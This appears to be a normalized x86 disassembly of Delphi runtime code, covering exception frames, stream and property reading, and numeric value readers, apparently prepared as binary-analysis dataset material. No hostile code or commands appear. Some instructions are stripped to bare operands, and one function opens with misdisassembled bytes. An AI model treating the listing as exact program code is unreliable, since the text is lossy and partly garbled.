call sub_416970
sub_416bcc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax [ rw-data ]
call sub_413c24
mov esi eax
xor edx edx
push ebp
push sub_416c3c
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416c43
mov eax [ rw-data ]
call sub_413c88
retn
mov edx ebx
mov eax esi
call sub_413860
mov edx [ eax + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ eax + 0xc ]
cmp edx [ edi + 0xc ]
jne r-xdata
call sub_4030f0
mov edx ebx
mov eax esi
call sub_413750
sub_416c48
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_416d57
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416d5e
lea eax [ ebp - 0x8 ]
call sub_403eac
retn
xor edx edx
push ebp
push sub_416d3a
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_416d8c
retn
inc eax
mov [ ebp - 0xc ] eax
xor esi esi
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
mov eax ebx
call sub_41645c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_413860
mov ebx eax
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x14 ]
call sub_403f44
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_416538
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_413860
call sub_416bcc
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_413860
mov edx eax
mov eax [ rw-data ]
call sub_413b9c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
xor ecx ecx
mov edx esi
call sub_4139ac
jmp r-xdata
inc esi
dec [ ebp - 0xc ]
jne r-xdata
sub_416d68
push ebx
mov ebx eax
mov eax ebx
call sub_416e5c
cdq
push edx
push eax
mov eax [ ebx + 0x4 ]
call sub_4158c4
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
pop ebx
retn
sub_416d8c
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x30 ]
call sub_4030f0
xor eax eax
mov [ ebx + 0x30 ] eax
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_413860
call sub_4030f0
inc edi
dec esi
jne r-xdata
sub_416dc8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] eax
mov eax edx
call sub_403038
mov ebp eax
jmp r-xdata
cmp ebp [ r-xdata ]
jne r-xdata
mov eax ebp
call sub_412ef4
mov esi eax
test esi esi
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x74 ]
test eax eax
je r-xdata
mov eax ebp
call sub_40307c
mov ebp eax
movsx ebx [ esi ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esp + 0x4 ]
call sub_412f6c
mov edi eax
mov edx [ esp + 0x4 ]
call sub_412e6c
mov edi eax
jmp r-xdata
inc ebx
mov [ esp + 0x8 ] 0x0
mov eax edi
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc [ esp + 0x8 ]
dec ebx
jne r-xdata
mov eax [ esp + 0x8 ]
mov eax [ esi + eax * 4 + 0x2 ]
mov edi [ eax ]
mov edx [ esp + 0x4 ]
mov eax edi
call sub_403054
test al al
jne r-xdata
sub_416e98
push esi
push edi
push ebx
mov edi edx
mov ebx ecx
mov esi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ esi + 0x14 ]
sub ecx [ esi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax esi
call sub_416ee4
mov ecx [ esi + 0x14 ]
push esi
sub ebx ecx
mov eax [ esi + 0x8 ]
add eax [ esi + 0x10 ]
add [ esi + 0x10 ] ecx
mov esi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
mov ecx ebx
sub_416ee4
push ebx
push esi
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov esi eax
mov [ ebx + 0x14 ] esi
test esi esi
jne r-xdata
xor eax eax
mov [ ebx + 0x10 ] eax
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b27c
call sub_403864
sub_416f34
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_416f7f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_418734
mov eax [ ebp - 0x4 ]
call sub_40416c
dec eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416f86
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
call sub_416970
sub_416f8c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_41702c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_416b30
test al al
jne r-xdata
mov eax ebx
call sub_416b30
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4143c8
jmp r-xdata
mov eax ebx
call sub_416e74
add al 0xfe
sub al 0x3
jae r-xdata
mov eax ebx
call sub_417a9c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417033
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
mov eax [ ebp - 0x4 ]
call sub_414398
mov esi eax
mov eax ebx
call sub_417a94
jmp r-xdata
mov eax ebx
call sub_4179e4
mov eax ebx
call sub_416b30
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_417c00
mov eax ebx
call sub_417a9c
sub_41705c
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404c74
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ebp
retn
inc ebx
xor esi esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + esi * 4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x34 ]
call sub_413704
inc esi
dec ebx
jne r-xdata
sub_417098
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_41a130
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404c74
inc eax
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov ecx 0x1
mov edx [ r-xdata ]
call sub_404e30
add esp 0x4
mov edx ebx
mov eax edi
call sub_41a104
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404c74
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
pop ecx
mov [ edx + eax * 4 - 0x4 ] ecx
mov edx ebx
mov eax edi
call sub_41a104
test [ eax + 0x24 ] 0x4
je r-xdata
sub_417110
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404c74
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ ebp - 0x2 ]
not eax
and ax [ edi + 0x1c ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ edi + 0x1c ]
or ax [ ebp - 0x2 ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
jmp r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_417178
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x1
jne r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov al 0x1
pop ebp
retn
sub_417198
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
xor ebx ebx
call sub_40275c
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
call sub_417178
pop ecx
test al al
je r-xdata
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
xor edx edx
call sub_418bc8
call sub_40275c
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax [ esi ]
call sub_4030f0
sub_4171f8
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_4172de
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_418d68
mov ebx eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x14 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x6a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov ecx ebx
mov eax [ esi + 0x6c ]
call [ esi + 0x68 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax ebx
call [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x4
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
push ebp
push sub_4172b2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax + 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or edx 0xffffffff
mov ebx [ eax ]
call [ ebx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_4172e3
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_417198
pop ecx
test al al
jne r-xdata
call sub_4038e0
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_40388c
sub_417308
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_417380
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0x2c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff8
call sub_4032ec
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
test [ eax + 0x1c ] 0x10
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
call sub_4133ac
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x14 ]
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_417385
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_417198
pop ecx
test al al
jne r-xdata
call sub_4038e0
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_40388c
sub_4173a8
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_417423
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_418d68
mov ecx eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff2
call sub_4032ec
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ eax + 0x2c ] ebx
mov eax [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0x2c ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_417428
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_417198
pop ecx
test al al
jne r-xdata
call sub_4038e0
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_40388c
sub_41744c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41766d
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x9 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_4186f8
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_4186f8
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x28 ] eax
xor eax eax
push ebp
push sub_41763d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
test [ ebp - 0x9 ] 0x1
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
xor eax eax
push ebp
push sub_4175fb
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x14 ]
call sub_417098
pop ecx
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x1
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_417110
pop ecx
test [ ebp - 0x9 ] 0x1
jne r-xdata
push ebp
call sub_4171f8
pop ecx
push ebp
call sub_4173a8
pop ecx
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push ebp
call sub_417308
pop ecx
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
call sub_403910
jmp r-xdata
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x2
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_417110
pop ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x14 ]
and [ eax + 0x1c ] 0xfffd
push ebp
xor edx edx
mov ax [ r-xdata ]
call sub_417110
pop ecx
test [ ebp - 0x9 ] 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x1c ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417674
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_403ed0
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_404e3c
retn
test [ ebp - 0x9 ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
mov si 0xfff9
call sub_4032ec
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_4138bc
test eax eax
jge r-xdata
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_41705c
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_413704
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_41705c
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_413704
sub_417600
push ebp
call sub_417178
pop ecx
test al al
je r-xdata
call sub_40388c
call sub_4038e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
mov eax [ ebp - 0x14 ]
call sub_4030f0
sub_417688
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4176f8
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
xor eax eax
push ebp
push sub_4176e3
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4176f8
mov eax [ ebp - 0x4 ]
call sub_416c48
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_416d8c
retn
sub_4176f8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_416b30
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_417c00
mov eax [ ebp - 0x4 ]
call sub_417a9c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0xc ] eax
mov eax ebx
mov si 0xfffb
call sub_4032ec
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2c ] eax
xor eax eax
push ebp
push sub_4177ba
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov si 0xfffc
call sub_4032ec
mov edi eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] edi
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_416b30
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41744c
mov eax [ ebp - 0x4 ]
call sub_417a9c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4177c1
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x28 ] edx
retn
sub_4177c8
push ebx
add esp 0xffffffec
mov ebx eax
mov eax ebx
call sub_4188d4
cmp al 0x5
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_417a50
mov [ esp + 0xc ] eax
mov [ esp + 0x10 ] edx
fild [ esp + 0xc ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0xa
mov eax ebx
call sub_416e98
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
sub_41780c
push ebx
add esp 0xfffffff4
mov ebx eax
mov eax ebx
call sub_4188d4
cmp al 0xf
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_417a50
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] edx
fild [ esp + 0x4 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_416e98
jmp r-xdata
fld [ esp ]
add esp 0xc
pop ebx
retn
sub_417850
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_4188d4
cmp al 0x10
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_417a50
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_416e98
jmp r-xdata
fild [ esp ]
add esp 0x10
pop ebx
retn
sub_4178a0
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_4188d4
cmp al 0x11
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_417a50
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_416e98
jmp r-xdata
fld [ esp ]
add esp 0x10
pop ebx
retn
sub_4178e4
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_4188d4
and eax 0x7f
cmp eax 0xd
ja r-xdata
call sub_416970
mov al [ eax + lookup_table_41790b ]
jmp [ eax * 4 + jump_table_417919 ]
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_416e98
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_403f9c
mov eax esi
call j_sub_404378
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_416e98
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403f00
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403f00
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403f00
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403f00
jmp r-xdata
pop edx
pop esi
pop ebx
retn
sub_4179e4
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_4188d4
sub al 0x2
je r-xdata
lea edx [ esp + 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_416e98
movsx eax [ esp + 0x4 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
lea edx [ esp + 0x6 ]
mov ecx 0x2
mov eax ebx
call sub_416e98
movsx eax [ esp + 0x6 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_416e98
jmp r-xdata
jmp r-xdata
call sub_416970
sub_417a50
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_416e74
cmp al 0x13
jne r-xdata
mov eax ebx
call sub_4179e4
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax ebx
call sub_4188d4
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_416e98
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
pop ebx
retn
sub_417aa4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov al [ r-xdata ]
mov [ esi ] al
mov eax ebx
call sub_416e74
and al 0xf0
cmp al 0xf0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4188d4
and al 0xf
mov [ esi ] al
test [ esi ] 0x2
je r-xdata
mov eax ebx
call sub_4179e4
mov [ edi ] eax
sub_417ae1
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffedc
push ebx
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_417bd5
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_403eac
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x8 ]
call sub_403f44
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x120 ] 0xb
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x11c ] eax
mov [ ebp - 0x118 ] 0xb
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x124 ]
push eax
push 0x3
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2b8
call sub_403864
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417bdc
lea edx [ ebp - 0x104 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_403040
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404110
sub_417c00
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_417dd0
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
push ebp
push j_sub_4036a4#7
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_4186f8
xor edx edx
push ebp
push j_sub_4036a4#6
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx 0x1
mov eax [ ebp - 0x8 ]
call sub_40416c
mov esi eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0xc ]
add eax 0x70
push eax
mov ecx ebx
sub ecx edi
mov edx edi
mov eax [ ebp - 0x8 ]
call sub_4043cc
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + ebx - 0x1 ] 0x2e
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_403318
